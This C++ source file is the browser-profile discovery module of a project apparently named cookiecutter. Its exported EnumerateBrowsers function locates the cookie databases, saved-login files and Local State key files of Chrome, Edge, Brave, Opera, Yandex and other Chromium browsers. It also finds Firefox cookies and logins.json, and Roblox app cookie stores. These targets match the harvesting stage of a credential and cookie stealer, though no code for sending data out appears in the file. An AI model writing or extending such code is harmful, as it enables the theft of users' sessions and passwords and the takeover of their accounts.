//=============================================================================
//  browser_paths.cpp — Browser profile discovery
//  Enumerates Chrome, Edge, Brave, Opera, Vivaldi, Firefox, and Roblox App.
//  Each profile: cookie DB path, login DB path, local state path.
//  All paths checked for existence before being returned.
//=============================================================================

#include "cookiecutter.h"
#include <shlobj.h>
#include <vector>
#include <filesystem>

namespace fs = std::filesystem;

// ---------------------------------------------------------------------------
//  Path helpers
// ---------------------------------------------------------------------------

static std::wstring GetLocalAppData() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, path))) {
        return std::wstring(path);
    }
    return L"";
}

static std::wstring GetAppData() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, path))) {
        return std::wstring(path);
    }
    return L"";
}

static bool DirExists(const std::wstring& path) {
    DWORD attrs = GetFileAttributesW(path.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY));
}

static bool FileExists(const std::wstring& path) {
    DWORD attrs = GetFileAttributesW(path.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
}

// ---------------------------------------------------------------------------
//  Chromium-based browser enumeration
//  Chrome, Edge, Brave, Opera, Vivaldi, OperaGX all use the same layout:
//    %localappdata%\<browser>\User Data\<Profile>\Network\Cookies   (v130+)
//    %localappdata%\<browser>\User Data\<Profile>\Cookies           (pre-v130)
//    %localappdata%\<browser>\User Data\<Profile>\Login Data
//    %localappdata%\<browser>\User Data\Local State
// ---------------------------------------------------------------------------

struct ChromiumDef {
    const wchar_t* name;
    const wchar_t* folder;      // under LocalAppData
};

static const ChromiumDef CHROMIUM_BROWSERS[] = {
    { L"Chrome",        L"Google\\Chrome"           },
    { L"Edge",          L"Microsoft\\Edge"          },
    { L"Brave",         L"BraveSoftware\\Brave-Browser" },
    { L"Opera",         L"Opera Software\\Opera Stable" },
    { L"Vivaldi",       L"Vivaldi"                  },
    { L"OperaGX",       L"Opera Software\\Opera GX Stable" },
    { L"Chromium",      L"Chromium"                 },
    { L"Yandex",        L"Yandex\\YandexBrowser"   },
    { L"360Browser",    L"360Chrome\\Chrome"        },
};

static void EnumerateChromiumProfiles(const std::wstring& localAppData,
                                       const ChromiumDef& def,
                                       std::vector<BrowserProfile>& out) {
    std::wstring userData = localAppData + L"\\" + def.folder + L"\\User Data";
    if (!DirExists(userData)) return;

    std::wstring localState = userData + L"\\Local State";

    // Find all profile directories: Default, Profile 1, Profile 2, etc.
    for (const auto& entry : fs::directory_iterator(userData)) {
        if (!entry.is_directory()) continue;
        std::wstring profileName = entry.path().filename().wstring();

        // Profile dirs start with "Default" or "Profile "
        bool isProfile = (profileName == L"Default") ||
                         (profileName.find(L"Profile ") == 0);
        if (!isProfile) continue;

        std::wstring profileDir = entry.path().wstring();

        // Check for Network\Cookies (Chrome v130+) first, then Cookies (older)
        std::wstring networkCookies = profileDir + L"\\Network\\Cookies";
        std::wstring cookiesFile     = profileDir + L"\\Cookies";
        std::wstring loginData       = profileDir + L"\\Login Data";

        std::wstring actualCookies;
        if (FileExists(networkCookies)) {
            actualCookies = networkCookies;
        } else if (FileExists(cookiesFile)) {
            actualCookies = cookiesFile;
        } else {
            continue; // no cookies DB in this profile
        }

        BrowserProfile bp;
        bp.name          = def.name;
        bp.cookiePath    = actualCookies;
        bp.loginDataPath = FileExists(loginData) ? loginData : L"";
        bp.localStatePath= FileExists(localState) ? localState : L"";
        bp.profileDir    = profileDir;
        bp.isChromium    = true;

        out.push_back(bp);
    }
}

// ---------------------------------------------------------------------------
//  Firefox enumeration
//  Cookies: %appdata%\Mozilla\Firefox\Profiles\<profile>\cookies.sqlite
//  Logins:  %appdata%\Mozilla\Firefox\Profiles\<profile>\logins.json
//           %appdata%\Mozilla\Firefox\Profiles\<profile>\key4.db
// ---------------------------------------------------------------------------

static void EnumerateFirefoxProfiles(const std::wstring& appData,
                                      std::vector<BrowserProfile>& out) {
    std::wstring profilesDir = appData + L"\\Mozilla\\Firefox\\Profiles";
    if (!DirExists(profilesDir)) return;

    for (const auto& entry : fs::directory_iterator(profilesDir)) {
        if (!entry.is_directory()) continue;
        std::wstring profileName = entry.path().filename().wstring();

        // Firefox profiles usually end with .default-release, .default, etc.
        if (profileName.find(L".") == std::wstring::npos) continue;

        std::wstring profileDir = entry.path().wstring();
        std::wstring cookiesFile = profileDir + L"\\cookies.sqlite";
        std::wstring loginsFile  = profileDir + L"\\logins.json";

        if (!FileExists(cookiesFile) && !FileExists(loginsFile)) continue;

        BrowserProfile bp;
        bp.name          = L"Firefox";
        bp.cookiePath    = FileExists(cookiesFile) ? cookiesFile : L"";
        bp.loginDataPath = FileExists(loginsFile)  ? loginsFile  : L"";
        bp.localStatePath= L"";  // Firefox doesn't use Local State
        bp.profileDir    = profileDir;
        bp.isChromium    = false;

        out.push_back(bp);
    }
}

// ---------------------------------------------------------------------------
//  Roblox App enumeration
//  Windows store app: %localappdata%\Packages\ROBLOXCorporation.*\...
//  Standard install:   %localappdata%\Roblox\
// ---------------------------------------------------------------------------

static void EnumerateRobloxProfiles(const std::wstring& localAppData,
                                     std::vector<BrowserProfile>& out) {
    // Standard Roblox install
    std::wstring robloxLocal = localAppData + L"\\Roblox";
    if (DirExists(robloxLocal)) {
        // Search for cookies files in LocalStorage or root
        for (const auto& entry : fs::recursive_directory_iterator(robloxLocal)) {
            if (!entry.is_regular_file()) continue;
            std::wstring fn = entry.path().filename().wstring();
            // Look for cookie databases or localStorage files
            if (fn.find(L"Cookies") != std::wstring::npos ||
                fn.find(L"cookie") != std::wstring::npos ||
                fn == L"Local Storage" ||
                fn.find(L".sqlite") != std::wstring::npos) {
                
                BrowserProfile bp;
                bp.name          = L"Roblox App";
                bp.cookiePath    = entry.path().wstring();
                bp.loginDataPath = L"";
                bp.localStatePath= L"";
                bp.profileDir    = robloxLocal;
                bp.isChromium    = false;
                out.push_back(bp);
                break; // one entry is enough for Roblox
            }
        }
    }

    // Also check Windows Store package
    std::wstring packages = localAppData + L"\\Packages";
    if (DirExists(packages)) {
        for (const auto& entry : fs::directory_iterator(packages)) {
            std::wstring fn = entry.path().filename().wstring();
            if (fn.find(L"ROBLOX") != std::wstring::npos) {
                std::wstring pkgDir = entry.path().wstring();
                // Recurse to find cookies
                for (const auto& sub : fs::recursive_directory_iterator(pkgDir)) {
                    if (!sub.is_regular_file()) continue;
                    std::wstring sfn = sub.path().filename().wstring();
                    if (sfn.find(L"Cookies") != std::wstring::npos ||
                        sfn.find(L".sqlite") != std::wstring::npos) {
                        
                        BrowserProfile bp;
                        bp.name          = L"Roblox WinStore";
                        bp.cookiePath    = sub.path().wstring();
                        bp.loginDataPath = L"";
                        bp.localStatePath= L"";
                        bp.profileDir    = pkgDir;
                        bp.isChromium    = false;
                        out.push_back(bp);
                        break;
                    }
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
//  Public API
// ---------------------------------------------------------------------------

extern "C" CC_API int EnumerateBrowsers(BrowserProfile* out, int maxCount) {
    std::vector<BrowserProfile> profiles;

    std::wstring localAppData = GetLocalAppData();
    std::wstring appData = GetAppData();

    // Chromium family
    for (const auto& def : CHROMIUM_BROWSERS) {
        EnumerateChromiumProfiles(localAppData, def, profiles);
    }

    // Firefox
    EnumerateFirefoxProfiles(appData, profiles);

    // Roblox
    EnumerateRobloxProfiles(localAppData, profiles);

    // Copy to output
    int count = std::min((int)profiles.size(), maxCount);
    for (int i = 0; i < count; i++) {
        out[i] = profiles[i];
    }
    return count;
}
